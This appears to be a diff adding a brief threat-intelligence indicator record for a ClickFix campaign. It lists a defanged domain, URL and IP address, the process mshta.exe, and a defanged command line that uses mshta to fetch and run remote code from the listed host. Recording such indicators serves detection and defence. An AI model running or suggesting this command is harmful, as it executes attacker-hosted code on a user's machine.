@@ -1,0 +1,17 @@
+# Research #001 - ClickFix
+# Observed: 2026-09-03
+
+[DOMAIN]
+timelevel12[.]com
+
+[URL]
+hxxp://timelevel12[.]com/big
+
+[IP]
+104.18.40[.]153
+
+[PROCESS]
+mshta.exe
+
+[COMMAND]
+mshta hxxp://timelevel12[.]com/big
